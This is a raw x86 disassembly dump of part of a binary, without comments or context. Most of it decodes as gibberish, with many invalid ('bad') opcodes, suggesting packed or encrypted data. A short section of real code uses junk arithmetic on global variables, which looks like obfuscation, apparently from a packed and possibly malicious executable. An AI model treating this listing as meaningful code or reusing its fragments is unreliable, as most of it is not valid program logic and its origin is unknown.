  41e6af:	lock xor bl,BYTE PTR [eax-0x4761644a]
  41e6b6:	fiadd  WORD PTR [esi+0x53]
  41e6b9:	xchg   esp,eax
  41e6ba:	inc    edx
  41e6bb:	enter  0x2dd1,0xe4
  41e6bf:	mov    esp,0x4a0d21e5
  41e6c4:	les    ebp,FWORD PTR es:[eax]
  41e6c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e6c8:	push   0x1e
  41e6ca:	jmp    0xbde224b6
  41e6cf:	iret   
  41e6d0:	into   
  41e6d1:	and    eax,0xd251710e
  41e6d6:	mov    ebp,0x96c483ad
  41e6db:	or     al,0xc0
  41e6dd:	lods   eax,DWORD PTR ds:[esi]
  41e6de:	sub    al,0xa1
  41e6e0:	(bad)  
  41e6e1:	mov    ch,0x3e
  41e6e3:	(bad)  
  41e6e4:	fcomp  QWORD PTR [eax+0x516aebaf]
  41e6ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e6eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e6ec:	xchg   BYTE PTR [edi+0x6f155230],dl
  41e6f2:	dec    ecx
  41e6f3:	(bad)  
  41e6f4:	clc    
  41e6f5:	cld    
  41e6f6:	shl    BYTE PTR [eax+ebx*2-0x1162def5],cl
  41e6fd:	lods   al,BYTE PTR ds:[esi]
  41e6fe:	sbb    DWORD PTR [edi],0x78
  41e701:	and    esi,DWORD PTR [ecx+0x69582900]
  41e707:	(bad)  
  41e708:	jecxz  0x41e718
  41e70a:	arpl   WORD PTR [edx+0x5f],bx
  41e70d:	push   ebx
  41e70e:	cmp    edx,DWORD PTR [ebx]
  41e710:	leave  
  41e711:	mov    esp,0x25b4cf55
  41e716:	push   esi
  41e717:	fcmovnu st,st(0)
  41e719:	mov    ebp,0xff9c78fb
  41e71e:	inc    ecx
  41e71f:	xchg   ah,ch
  41e721:	mov    ebx,0xd6e8fbce
  41e726:	adc    edx,ecx
  41e728:	inc    esi
  41e729:	repnz lea edi,[ebp-0x54]
  41e72d:	aam    0xcb
  41e72f:	inc    bl
  41e731:	mov    ebp,0x1485b34e
  41e736:	xor    bh,BYTE PTR ds:0x90722ef1
  41e73c:	repz mov ds:0xe19a54b1,eax
  41e742:	mov    WORD PTR [eax+ecx*2+0x29],ss
  41e746:	inc    eax
  41e747:	das    
  41e748:	pop    DWORD PTR ds:0x52d877bb
  41e74e:	les    ebp,FWORD PTR [edi+edx*8]
  41e751:	mov    edi,0xdddae19b
  41e756:	push   ds
  41e757:	sar    BYTE PTR [ebp+0x4cc160a],0xe0
  41e75e:	sbb    edi,DWORD PTR [ebx+0x70]
  41e761:	nop
  41e762:	lahf   
  41e763:	push   cs
  41e764:	cmp    edx,DWORD PTR [edi]
  41e766:	aaa    
  41e767:	and    eax,0x8aa30594
  41e76c:	cmp    ebx,DWORD PTR [ecx+0x7fa2cb9b]
  41e772:	cmp    DWORD PTR [ebx],esi
  41e774:	inc    ebx
  41e775:	mov    fs,WORD PTR ss:[edi-0x1f]
  41e779:	mov    dh,0x88
  41e77b:	mov    eax,0xb1b4193b
  41e780:	jbe    0x41e7e0
  41e782:	pop    eax
  41e783:	and    DWORD PTR [eax],edi
  41e785:	push   ss
  41e786:	fadd   DWORD PTR [ecx+0x75]
  41e789:	pop    ebp
  41e78a:	es xchg esp,eax
  41e78c:	fist   WORD PTR [esi-0x5a]
  41e78f:	and    dl,al
  41e791:	bound  ecx,QWORD PTR ds:0x4f7b75
  41e797:	adc    DWORD PTR [esi+ecx*2],ebx
  41e79a:	inc    esi
  41e79b:	jbe    0x41e7cb
  41e79d:	fstp   QWORD PTR [esi+0x74]
  41e7a0:	dec    esp
  41e7a1:	lahf   
  41e7a2:	sub    bl,bl
  41e7a4:	push   ecx
  41e7a5:	inc    esp
  41e7a6:	xchg   ecx,eax
  41e7a7:	add    DWORD PTR [eax],ecx
  41e7a9:	lods   al,BYTE PTR ds:[esi]
  41e7aa:	jae    0x41e791
  41e7ac:	or     BYTE PTR [ebp+0x5],0x7f
  41e7b0:	adc    BYTE PTR [edx+0x25405806],ch
  41e7b6:	aaa    
  41e7b7:	into   
  41e7b8:	xchg   ecx,eax
  41e7b9:	out    0xe5,eax
  41e7bb:	xor    al,0x5d
  41e7bd:	fldenv [ebx+edi*4]
  41e7c0:	clc    
  41e7c1:	fsubr  st,st(3)
  41e7c3:	adc    BYTE PTR [eax-0x7fbdcd78],bh
  41e7c9:	xacquire xchg BYTE PTR [ecx+0x3b9b0e34],cl
  41e7d0:	ds (bad) 
  41e7d2:	sbb    al,BYTE PTR [esi]
  41e7d4:	stos   BYTE PTR es:[edi],al
  41e7d5:	int    0xe4
  41e7d7:	retf   0xa859
  41e7da:	sub    eax,0xef08287a
  41e7df:	jno    0x41e81c
  41e7e1:	pop    eax
  41e7e2:	jns    0x41e7be
  41e7e4:	mov    ecx,0x172dbb1a
  41e7e9:	rol    DWORD PTR [edx],0x3
  41e7ec:	mov    edx,0x871113f2
  41e7f1:	es cwde 
  41e7f3:	(bad)  
  41e7f5:	es dec ebp
  41e7f7:	pop    ss
  41e7f8:	xchg   edx,eax
  41e7f9:	or     eax,0xed4e81cc
  41e7fe:	lahf   
  41e7ff:	mov    bl,0x57
  41e801:	(bad)  
  41e802:	cmp    eax,0xcd607f8e
  41e807:	popf   
  41e808:	push   cs
  41e809:	ror    DWORD PTR [eax+0xf],1
  41e80c:	mov    ecx,0x19b490c2
  41e811:	shl    DWORD PTR [edx-0x42],0x4a
  41e815:	retf   
  41e816:	daa    
  41e817:	mov    DWORD PTR [edi-0x4e],ebx
  41e81a:	mov    al,ds:0x444f8f50
  41e81f:	mov    bl,0x44
  41e821:	pop    eax
  41e822:	jl     0x41e876
  41e824:	neg    eax
  41e826:	cdq    
  41e827:	inc    edx
  41e828:	mov    eax,0xbab6148a
  41e82d:	pop    edx
  41e82e:	fbld   TBYTE PTR [ecx+0x52]
  41e831:	cs pusha 
  41e833:	xchg   esp,eax
  41e834:	mov    eax,0xd2e41acb
  41e839:	push   edx
  41e83a:	arpl   WORD PTR [ecx+0x1a],cx
  41e83d:	enter  0x418e,0x26
  41e841:	jo     0x41e8ab
  41e843:	je     0x41e7ed
  41e845:	dec    ebp
  41e846:	pop    esi
  41e847:	or     eax,0x28ebb865
  41e84c:	jbe    0x41e8b1
  41e84e:	pop    eax
  41e84f:	out    0x7,al
  41e851:	fdivp  st(1),st
  41e853:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e855:	fisttp QWORD PTR [edx+0x4cdbea32]
  41e85b:	push   eax
  41e85c:	mov    bl,0x17
  41e85e:	les    eax,FWORD PTR [ebx+ebx*4-0x30a52372]
  41e865:	loopne 0x41e8d2
  41e867:	push   cs
  41e868:	jb     0x41e8c3
  41e86a:	mov    eax,ds:0x11ed7979
  41e86f:	or     ch,bh
  41e871:	push   edi
  41e872:	jg     0x41e82a
  41e874:	jno    0x41e82b
  41e876:	mov    ah,0xcc
  41e878:	cli    
  41e879:	mov    cl,0x84
  41e87b:	rol    BYTE PTR [edx],1
  41e87d:	js     0x41e8b5
  41e87f:	jnp    0x41e8ab
  41e881:	and    BYTE PTR [edi+0x6b2c1fd9],al
  41e887:	push   esp
  41e888:	mov    eax,DWORD PTR [edx]
  41e88a:	mov    esi,0x3a0372d5
  41e88f:	inc    eax
  41e890:	arpl   WORD PTR [edi+0x61],cx
  41e893:	fsubr  QWORD PTR [ebp-0x6b]
  41e896:	mov    bh,0xf5
  41e898:	mov    bl,0xcc
  41e89a:	pop    ss
  41e89b:	push   0xffffffd4
  41e89d:	dec    ebx
  41e89e:	in     eax,0xc6
  41e8a0:	ret    
  41e8a1:	mov    ah,0x7e
  41e8a3:	pop    es
  41e8a4:	test   DWORD PTR [esi],esp
  41e8a6:	mov    ch,0xbc
  41e8a8:	sbb    BYTE PTR [ebp+0x8fb092d],al
  41e8ae:	pop    ebx
  41e8af:	mov    esp,0x9e1560eb
  41e8b4:	push   edx
  41e8b5:	int    0x73
  41e8b7:	sub    BYTE PTR ds:0x7a1700ba,dh
  41e8bd:	mov    esi,0x4552038f
  41e8c2:	inc    esp
  41e8c3:	pop    ss
  41e8c4:	inc    ebp
  41e8c5:	inc    eax
  41e8c6:	xor    eax,0xdd714482
  41e8cb:	int    0x8e
  41e8cd:	jns    0x41e908
  41e8cf:	js     0x41e8ac
  41e8d1:	jg     0x41e8ea
  41e8d3:	addr16 push esp
  41e8d5:	xchg   DWORD PTR [ebx-0xe],ebx
  41e8d8:	inc    edx
  41e8d9:	xchg   ecx,eax
  41e8da:	add    BYTE PTR [edx-0x52],bh
  41e8dd:	std    
  41e8de:	jle    0x41e8ae
  41e8e0:	mov    ebx,0xe8dcc360
  41e8e5:	pop    edi
  41e8e6:	mov    cl,0x2e
  41e8e8:	adc    ch,ah
  41e8ea:	nop
  41e8eb:	jle    0x41e8e8
  41e8ed:	in     eax,0xef
  41e8ef:	xor    bh,0x3b
  41e8f2:	in     eax,0x8e
  41e8f4:	jge    0x41e8b2
  41e8f6:	loopne 0x41e939
  41e8f8:	sar    DWORD PTR [ecx],cl
  41e8fa:	test   al,0x1a
  41e8fc:	inc    ebp
  41e8fd:	add    ch,BYTE PTR [edi-0x76]
  41e900:	xchg   BYTE PTR [esi+0x5c],al
  41e903:	pop    ecx
  41e904:	sahf   
  41e905:	lods   eax,DWORD PTR ds:[esi]
  41e906:	in     eax,0x16
  41e908:	adc    al,0xe9
  41e90a:	pop    ds
  41e90b:	push   0x3e74cbb6
  41e910:	and    BYTE PTR [ecx-0x4f],bh
  41e913:	fidivr DWORD PTR [eax-0x6]
  41e916:	call   0x39d1:0xce7fc6f0
  41e91d:	xor    BYTE PTR [edx-0x40],bl
  41e920:	fidivr WORD PTR [eax+0x50255b5b]
  41e926:	popa   
  41e927:	frndint 
  41e929:	(bad)  
  41e92a:	mov    al,0xa3
  41e92c:	add    al,0xfd
  41e92e:	add    esi,DWORD PTR [ecx]
  41e930:	out    dx,eax
  41e931:	lods   eax,DWORD PTR ds:[esi]
  41e932:	jne    0x41e8d2
  41e934:	bound  esi,QWORD PTR [ebp-0x5a6fbc12]
  41e93a:	clc    
  41e93b:	fdivrp st(7),st
  41e93d:	(bad)  
  41e93f:	cmp    BYTE PTR [edx],ah
  41e941:	call   0xc4d8d38d
  41e946:	ins    BYTE PTR es:[edi],dx
  41e947:	aam    0x18
  41e949:	rol    DWORD PTR [edi],cl
  41e94b:	cwde   
  41e94c:	adc    bl,BYTE PTR [eax]
  41e94e:	dec    ecx
  41e94f:	push   edi
  41e950:	sub    ecx,esi
  41e952:	enter  0x7d4a,0x4a
  41e956:	shr    ah,0xf6
  41e959:	dec    ecx
  41e95a:	retf   
  41e95b:	jno    0x41e9bd
  41e95d:	fsub   QWORD PTR [ebx]
  41e95f:	adc    BYTE PTR [ebx+0x507d094f],al
  41e965:	xchg   esp,eax
  41e966:	popfw  
  41e968:	in     eax,dx
  41e969:	out    0xac,al
  41e96b:	add    eax,DWORD PTR [edx]
  41e96d:	pop    ss
  41e96e:	ja     0x41e924
  41e970:	pop    eax
  41e971:	cmp    al,0xf
  41e973:	and    al,0xbf
  41e975:	push   cs
  41e976:	push   ds
  41e977:	xor    dl,bh
  41e979:	and    eax,0x66f4e2af
  41e97e:	nop
  41e97f:	inc    ebp
  41e980:	sub    al,0xf4
  41e982:	pop    ds
  41e983:	or     edx,edi
  41e985:	mov    ecx,edx
  41e987:	mov    edx,DWORD PTR [esp+0x18]
  41e98b:	xor    eax,ebx
  41e98d:	xor    ecx,esi
  41e98f:	mov    esi,DWORD PTR [esp+0x1c]
  41e993:	cmp    edx,eax
  41e995:	jne    0x41e9a3
  41e99b:	cmp    esi,ecx
  41e99d:	je     0x41e9ea
  41e9a3:	push   DWORD PTR ds:0x422608
  41e9a9:	push   DWORD PTR ds:0x42239c
  41e9af:	mov    eax,ds:0x422518
  41e9b4:	mov    eax,DWORD PTR [eax+0x1a4]
  41e9ba:	push   DWORD PTR [eax]
  41e9bc:	mov    eax,DWORD PTR [esp+0x78]
  41e9c0:	call   eax
  41e9c2:	mov    ecx,DWORD PTR ds:0x422518
  41e9c8:	mov    ecx,DWORD PTR [ecx+0x1dc]
  41e9ce:	mov    DWORD PTR [ecx],eax
  41e9d0:	mov    eax,ds:0x422518
  41e9d5:	push   0x4
  41e9d7:	add    eax,0x1dc
  41e9dc:	push   eax
  41e9dd:	lea    eax,[esp+0x84]
  41e9e4:	push   eax
  41e9e5:	call   0x415231
  41e9ea:	mov    eax,DWORD PTR [esp+0x7c]
  41e9ee:	mov    eax,DWORD PTR [eax]
  41e9f0:	pop    edi
  41e9f1:	pop    esi
  41e9f2:	pop    ebx
  41e9f3:	mov    esp,ebp
  41e9f5:	pop    ebp
  41e9f6:	ret    0xc
  41e9f9:	push   ebp
  41e9fa:	mov    ebp,esp
  41e9fc:	sub    esp,0x23c
  41ea02:	or     ecx,eax
  41ea04:	push   ebx
  41ea05:	cmp    DWORD PTR ds:0x428227,0x0
  41ea0c:	mov    DWORD PTR ds:0x428333,0x7749
  41ea16:	mov    DWORD PTR ds:0x428133,ebx
  41ea1c:	mov    DWORD PTR ds:0x4282d3,edx
  41ea22:	mov    DWORD PTR ds:0x4282d3,0xc7b
  41ea2c:	jmp    0x41ea8e
  41ea31:	mov    DWORD PTR ds:0x42824b,edx
  41ea37:	cmp    DWORD PTR ds:0x428227,0x0
  41ea3e:	jg     0x41ea74
  41ea44:	push   0x2154
  41ea49:	push   0x5063
  41ea4e:	call   DWORD PTR ds:0x428dd4
  41ea54:	sbb    DWORD PTR ds:0x42832f,ecx
  41ea5a:	mov    ecx,DWORD PTR ds:0x4282db
  41ea60:	xor    ecx,DWORD PTR ds:0x4282c7
  41ea66:	mov    DWORD PTR ds:0x4282db,ecx
  41ea6c:	sbb    ecx,0x6e15
  41ea72:	neg    ecx
  41ea74:	xor    DWORD PTR ds:0x428203,ecx
  41ea7a:	adc    ecx,DWORD PTR ds:0x428157
  41ea80:	mov    ecx,DWORD PTR ds:0x4281a3
  41ea86:	mov    ecx,DWORD PTR [ecx]
  41ea88:	and    DWORD PTR ds:0x428147,ecx
  41ea8e:	push   esi
  41ea8f:	mov    ecx,DWORD PTR ds:0x4281b7
  41ea95:	mov    eax,ds:0x4282a3
  41ea9a:	sub    eax,ecx
  41ea9c:	imul   ecx,DWORD PTR [ecx+eax*1]
  41eaa0:	push   edi
  41eaa1:	add    DWORD PTR ds:0x42821b,ebx
  41eaa7:	mov    DWORD PTR [ebp-0x50],0x1
  41eaae:	sub    DWORD PTR ds:0x42824b,edi
  41eab4:	mov    DWORD PTR [ebp-0xbc],0x61a1
  41eabe:	xor    DWORD PTR ds:0x4282db,0x437e
  41eac8:	mov    DWORD PTR [ebp-0xb8],0x1
  41ead2:	mov    ecx,DWORD PTR [ebp-0xb8]
  41ead8:	add    eax,0x2e28
  41eadd:	mov    eax,0x584
  41eae2:	xor    edx,edx
  41eae4:	sbb    DWORD PTR ds:0x428357,0x4282af
  41eaee:	div    ecx
  41eaf0:	xor    ecx,0x2352
  41eaf6:	imul   eax,eax,0x51d4
  41eafc:	neg    ecx
  41eafe:	mov    ecx,DWORD PTR [ebp-0xbc]
  41eb04:	or     DWORD PTR ds:0x428343,0x428353
  41eb0e:	xor    eax,ecx
  41eb10:	and    eax,0x4c09
  41eb15:	xor    ecx,DWORD PTR ds:0x4282c3
  41eb1b:	mov    ecx,DWORD PTR [ebp-0x50]
  41eb1e:	xor    edx,edx
  41eb20:	and    DWORD PTR ds:0x42821b,0x42814f
  41eb2a:	div    ecx
  41eb2c:	or     DWORD PTR ds:0x428367,0x3423
  41eb36:	sub    eax,0x401
  41eb3b:	cmp    DWORD PTR ds:0x4282e7,0x0
  41eb42:	mov    DWORD PTR ds:0x428357,edx
  41eb48:	mov    DWORD PTR ds:0x4281f7,ebx
  41eb4e:	not    DWORD PTR ds:0x4281f3
  41eb54:	jmp    0x41ebb2
  41eb59:	mov    DWORD PTR ds:0x4281eb,0x3ca0
  41eb63:	not    DWORD PTR ds:0x4282d7
  41eb69:	cmp    DWORD PTR ds:0x4282e7,0x0
  41eb70:	je     0x41eba0
  41eb76:	push   DWORD PTR [ebp-0x10]
  41eb79:	push   0x4da1
  41eb7e:	push   0x1144
  41eb83:	push   DWORD PTR [ebp-0x18]
  41eb86:	call   DWORD PTR ds:0x428dd8
  41eb8c:	add    edx,0x1800
  41eb92:	add    edx,DWORD PTR ds:0x42834f
  41eb98:	sub    ecx,ecx
  41eb9a:	adc    ecx,0x47f1
  41eba0:	sub    edx,edx
  41eba2:	mov    DWORD PTR ds:0x428357,0x44a4
  41ebac:	and    ecx,DWORD PTR ds:0x4281ef
  41ebb2:	mov    DWORD PTR [ebp-0x90],eax
  41ebb8:	mov    eax,ds:0x428283
  41ebbd:	mov    eax,DWORD PTR [eax]
  41ebbf:	sbb    DWORD PTR ds:0x428353,eax
  41ebc5:	mov    DWORD PTR [ebp-0x8c],0x2ff8
  41ebcf:	add    DWORD PTR ds:0x42811b,0x428267
  41ebd9:	mov    DWORD PTR [ebp-0x4c],0x39f7
  41ebe0:	xor    DWORD PTR ds:0x42820f,edx
  41ebe6:	mov    DWORD PTR [ebp-0xb4],0x3842
  41ebf0:	or     edx,ecx
  41ebf2:	jmp    0x41ef4e
  41ebf7:	ret    0x8bf6
  41ebfa:	push   ebx
  41ebfb:	sbb    ch,BYTE PTR [ebx]
  41ebfd:	mov    edx,0x71125f66
  41ec02:	mov    al,0x8c
  41ec04:	(bad)  
  41ec05:	lock mov esi,0x18162f0e
  41ec0b:	mov    ds:0xb0181812,eax
  41ec10:	(bad)  
  41ec11:	ins    DWORD PTR es:[edi],dx
  41ec12:	clc    
  41ec13:	(bad)  
  41ec14:	ds ds loop 0x41ec5b
  41ec18:	sbb    esp,DWORD PTR [esi+0x2e]
  41ec1b:	sub    BYTE PTR [edx+0x22962489],0xf2
  41ec22:	add    BYTE PTR [ecx],dh
  41ec24:	je     0x41ebc5
  41ec26:	xchg   ebx,eax
  41ec27:	rcl    DWORD PTR [esi+0x59],0x66
  41ec2b:	jne    0x41ec17
  41ec2d:	mov    DWORD PTR [ecx-0x6c777edb],ebp
  41ec33:	(bad)  
  41ec34:	test   al,0x62
  41ec36:	call   0x95b4:0x4cc4a1ac
  41ec3d:	xor    dh,BYTE PTR [ebx+0x1e558385]
  41ec43:	mov    al,0xb3
  41ec45:	lds    edx,FWORD PTR [edi+0x2c15ad2b]
  41ec4b:	push   0xffffffab
  41ec4d:	sti    
  41ec4e:	jge    0x41eca5
  41ec50:	add    esp,DWORD PTR [ecx]
  41ec52:	lods   al,BYTE PTR ds:[esi]
  41ec53:	lds    eax,FWORD PTR [ecx]
  41ec55:	cmc    
  41ec56:	push   ebx
  41ec57:	inc    esi
  41ec58:	ins    DWORD PTR es:[edi],dx
  41ec59:	bnd jns 0x41ecc2
  41ec5c:	out    0x9,al
  41ec5e:	imul   ebp,esp,0x2f
  41ec61:	jge    0x41ebff
  41ec63:	mov    dh,0x1
  41ec65:	adc    BYTE PTR [ebp-0x5993212e],0x6a
  41ec6c:	adc    eax,0x4647d149
  41ec71:	push   eax
  41ec72:	sub    DWORD PTR [edx],eax
  41ec74:	xor    BYTE PTR [edi+ecx*4],cl
  41ec77:	test   BYTE PTR [eax+0x280bab32],dl
  41ec7d:	jo     0x41ecea
  41ec7f:	in     al,0x4b
  41ec81:	test   BYTE PTR [esi],dh
  41ec83:	dec    BYTE PTR [eax-0x1a]
  41ec86:	pusha  
  41ec87:	jl     0x41ecba
  41ec89:	ficom  WORD PTR [edi+0x44]
  41ec8c:	inc    esp
  41ec8d:	cmp    DWORD PTR [ebx+eiz*1],ecx
  41ec90:	(bad)  
  41ec91:	faddp  st(6),st
  41ec93:	(bad)  
  41ec94:	or     al,dl
  41ec96:	mov    eax,ds:0xbbd43a
  41ec9b:	dec    esp
  41ec9c:	jmp    0xfc82:0x8c59286f
  41eca3:	aaa    
  41eca4:	popa   
  41eca5:	aaa    
  41eca6:	inc    esi
  41eca7:	neg    bh
  41eca9:	cmc    
  41ecaa:	aad    0xf4
  41ecac:	mov    ?,WORD PTR [esi-0x66edf2a6]
  41ecb2:	std    
  41ecb3:	sub    bl,BYTE PTR [ecx]
  41ecb5:	ss mov esp,0x5d2e008e
  41ecbb:	add    eax,0xf185e248
  41ecc0:	cwde   
  41ecc1:	and    DWORD PTR [ecx],0xffffffc5
  41ecc4:	(bad)  [ebx-0x4ec1c429]
  41ecca:	lods   al,BYTE PTR ds:[esi]
  41eccb:	push   ecx
  41eccc:	std    
  41eccd:	daa    
  41ecce:	ins    BYTE PTR es:[edi],dx
  41eccf:	and    DWORD PTR [esi+0x2728bc0a],0x70
  41ecd6:	xchg   edx,eax
  41ecd7:	imul   ecx,esp,0xffffffc5
  41ecda:	ss inc ebx
  41ecdc:	fsub   QWORD PTR [esi]
  41ecde:	jae    0x41ece6
  41ece0:	clc    
  41ece1:	daa    
  41ece2:	int3   
  41ece3:	jae    0xe6abe40e
  41ece9:	mov    dh,0x9c
  41eceb:	or     bl,ah
  41eced:	mov    DWORD PTR ds:0x68104f04,edx
  41ecf3:	pop    ss
  41ecf4:	into   
  41ecf5:	xchg   ebx,eax
  41ecf6:	push   edi
  41ecf7:	jmp    0x41ed70
  41ecf9:	out    dx,eax
  41ecfa:	repnz (bad) 
  41ecfc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ecfd:	stc    
  41ecfe:	scas   al,BYTE PTR es:[edi]
  41ecff:	cmp    al,BYTE PTR [esi-0x48]
  41ed02:	push   ds
  41ed03:	push   esi
  41ed04:	mov    ch,0x4f
  41ed06:	pop    eax
  41ed07:	test   esp,0xbc6af78c
  41ed0d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ed0e:	cmc    
  41ed0f:	shr    BYTE PTR [eax],cl
  41ed11:	test   DWORD PTR [ebp-0xcd11180],eax
  41ed17:	outs   dx,DWORD PTR ds:[esi]
  41ed18:	add    DWORD PTR [ebx-0x19],esp
  41ed1b:	push   eax
  41ed1c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ed1d:	(bad)
  41ed22:	xor    BYTE PTR [eax+0x53],dh
  41ed25:	cmp    cl,BYTE PTR [edx]
  41ed27:	popf   
  41ed28:	pop    ecx
  41ed29:	popf   
  41ed2a:	arpl   si,cx
  41ed2c:	fidivr DWORD PTR [eax-0x6c]
  41ed2f:	lock add ebp,ebx
  41ed32:	jae    0x41ed4b
  41ed34:	lock dec ebx
  41ed36:	and    dl,BYTE PTR [edi+0x71]
  41ed39:	mov    esi,0xa7d07481
  41ed3e:	dec    ebp
  41ed3f:	in     al,0xfa
  41ed41:	and    eax,0x2f45b31d
  41ed46:	pop    ebx
  41ed47:	loop   0x41ecef
  41ed49:	xor    al,0x40
  41ed4b:	add    esi,0xbd4f7446
  41ed51:	xor    esi,eax
  41ed53:	xchg   ebp,eax
  41ed54:	mov    bl,0x88
  41ed56:	(bad)  
  41ed58:	stc    
  41ed59:	mov    al,0x71
  41ed5b:	mov    esp,0x8d30d0fa
  41ed60:	jmp    0x41ed26
  41ed62:	aad    0xd6
  41ed64:	adc    DWORD PTR [esi-0x5e1c1e61],ecx
  41ed6a:	sub    eax,0xaf2ac691
  41ed6f:	aaa    
  41ed70:	fdivr  st,st(1)
  41ed72:	and    dh,al
  41ed74:	mov    esp,0x7a0655d0
  41ed79:	inc    edx
  41ed7a:	mov    al,0x47
  41ed7c:	xchg   ecx,eax
  41ed7d:	dec    eax
  41ed7e:	inc    edi
  41ed7f:	lahf   
  41ed80:	aaa    
  41ed81:	add    edi,DWORD PTR [edi+0x15dbd6d9]
  41ed87:	test   DWORD PTR [ecx-0x25],esp
  41ed8a:	test   al,0x23
  41ed8c:	xchg   esi,eax
  41ed8d:	(bad)  
  41ed8e:	outs   dx,DWORD PTR ds:[esi]
  41ed8f:	lods   eax,DWORD PTR ds:[esi]
  41ed90:	test   al,0x9b
  41ed92:	gs mov edi,0x8327b436
  41ed98:	repnz mov cl,BYTE PTR [ecx-0xe]
  41ed9c:	iret   
  41ed9d:	push   ecx
  41ed9e:	add    ebp,DWORD PTR [edi]
  41eda0:	jp     0x41edfa
  41eda2:	outs   dx,DWORD PTR ds:[esi]
  41eda3:	sub    al,0x8
  41eda5:	xchg   esp,eax
  41eda6:	out    0xc8,al
  41eda8:	xchg   esi,eax
  41eda9:	(bad)  
  41edaa:	dec    ebp
  41edab:	nop
  41edac:	adc    DWORD PTR [eax+0x1a],ebp
  41edaf:	arpl   WORD PTR [edi+edi*8-0x4b],di
  41edb3:	pop    edx
  41edb4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41edb5:	push   ebp
  41edb6:	test   BYTE PTR [ecx-0x75],al
  41edb9:	xchg   esi,eax
  41edba:	inc    ebx
  41edbb:	retf   0x8297
  41edbe:	lods   eax,DWORD PTR ds:[esi]
  41edbf:	ja     0x41ed84
  41edc1:	outs   dx,DWORD PTR ds:[esi]
  41edc2:	ret    0x5456
  41edc5:	push   edx
  41edc6:	or     eax,0xd9ea7a14
  41edcb:	hlt    
  41edcc:	jbe    0x41ee4a
  41edce:	sahf   
  41edcf:	mov    ds:0x7ba7f581,eax
  41edd4:	adc    ch,bh
  41edd6:	mov    ch,0x51
  41edd8:	xor    al,0xb4
  41edda:	rol    DWORD PTR [ebp-0x1c],cl
  41eddd:	fndisi(8087 only) 
  41eddf:	cwde   
  41ede0:	push   es
  41ede1:	dec    eax
  41ede2:	mov    bl,0xc1
  41ede4:	and    esp,DWORD PTR [ebx+0x606e67f]
  41edea:	je     0x41ee2e
  41edec:	fdivr  st(5),st
  41edee:	rcl    eax,0x5f
  41edf1:	pop    ecx
  41edf2:	mov    edx,0xda7e707c
  41edf7:	adc    al,0xf2
  41edf9:	push   cs
  41edfa:	lds    ecx,FWORD PTR [esi]
  41edfc:	js     0x41ee1c
  41edfe:	imul   esi,DWORD PTR [eax],0xffffff84
  41ee01:	call   0xa5e8:0x71820224
  41ee08:	retf   
  41ee09:	imul   esi,DWORD PTR [edi],0xaef9b024
  41ee0f:	mov    edi,0xe1aa870f
  41ee14:	std    
  41ee15:	or     ch,BYTE PTR [ebp-0x610a7939]
  41ee1b:	outs   dx,BYTE PTR ds:[esi]
  41ee1c:	pop    edx
  41ee1d:	mov    gs,WORD PTR [ebp+0x7a7e9de4]
  41ee23:	cmp    al,0xaf
  41ee25:	ins    DWORD PTR es:[edi],dx
  41ee26:	(bad)  
  41ee27:	xchg   ebx,eax
  41ee28:	gs mov eax,0x8bc7a02f
  41ee2e:	lahf   
  41ee2f:	in     eax,dx
  41ee30:	jg     0x41ee57
  41ee32:	scas   al,BYTE PTR es:[edi]
  41ee33:	jmp    DWORD PTR [eax-0x6c491a19]
  41ee39:	sbb    eax,0x2dd2a119
  41ee3e:	xchg   esi,eax
  41ee3f:	pop    esi
  41ee40:	push   esi
  41ee41:	(bad)  
  41ee42:	mov    ch,0xe2
  41ee44:	out    dx,al
  41ee45:	leave  
  41ee46:	(bad)  
  41ee47:	loop   0x41ee2e
  41ee49:	mov    BYTE PTR [eax-0x5f],ah
  41ee4c:	int3   
  41ee4d:	retf   
  41ee4e:	sub    esp,DWORD PTR [esi]
  41ee50:	pop    es
  41ee51:	and    BYTE PTR [edx],al
  41ee53:	lods   eax,DWORD PTR gs:[esi]
  41ee55:	pop    esp
  41ee56:	pop    ss
  41ee57:	leave  
  41ee58:	xor    eax,0xccb024e3
  41ee5d:	dec    edx
  41ee5e:	xor    eax,0x1a0d9db4
  41ee63:	fidivr WORD PTR [esi-0x5341777d]
  41ee69:	xchg   esp,eax
  41ee6a:	cdq    
  41ee6b:	out    dx,eax
  41ee6c:	iret   
  41ee6d:	dec    esi
  41ee6e:	sbb    eax,0x2cc55859
  41ee73:	mov    dl,0xff
  41ee75:	les    edx,FWORD PTR [edi]
  41ee77:	mov    bh,0x30
  41ee79:	leave  
  41ee7a:	loop   0x41ee7d
  41ee7c:	inc    edi
  41ee7d:	push   edi
  41ee7e:	xchg   BYTE PTR [ecx+0x478c40c7],dl
  41ee84:	sti    
  41ee85:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ee86:	sbb    eax,DWORD PTR ss:[ebx+0x29]
  41ee8a:	pop    ebp
  41ee8b:	mov    ebx,0xcf1afbf9
  41ee90:	add    DWORD PTR [esi],ecx
  41ee92:	cmp    eax,0xa28ccac
  41ee97:	fdiv   DWORD PTR [eax+0x9a068ea]
  41ee9d:	lods   eax,DWORD PTR ds:[esi]
  41ee9e:	xchg   edx,eax
  41ee9f:	xchg   esp,eax
  41eea0:	dec    ebp
  41eea1:	aam    0xf7
  41eea3:	xor    esi,DWORD PTR [edi+0x188dfc66]
  41eea9:	xchg   ebp,eax
  41eeaa:	pop    ss
  41eeab:	aas    
  41eeac:	loop   0x41eefe
  41eeae:	rol    DWORD PTR [ebp-0x4693f342],cl
  41eeb4:	in     eax,0x5d
  41eeb6:	pop    ss
  41eeb7:	jge    0x41eea0
  41eeb9:	outs   dx,DWORD PTR ds:[esi]
  41eeba:	jb     0x41eee1
  41eebc:	sub    BYTE PTR [edi],dh
  41eebe:	mov    edx,0xce4a2afc
  41eec3:	add    esi,DWORD PTR [eax+0x40]
  41eec6:	inc    ecx
  41eec7:	gs or  ecx,eax
  41eeca:	hlt    
  41eecb:	mov    cl,0x5a
  41eecd:	fsub   QWORD PTR [edx+0x96105b9]
  41eed3:	dec    ebx
  41eed4:	scas   eax,DWORD PTR es:[edi]
  41eed5:	(bad)  
  41eed7:	inc    ecx
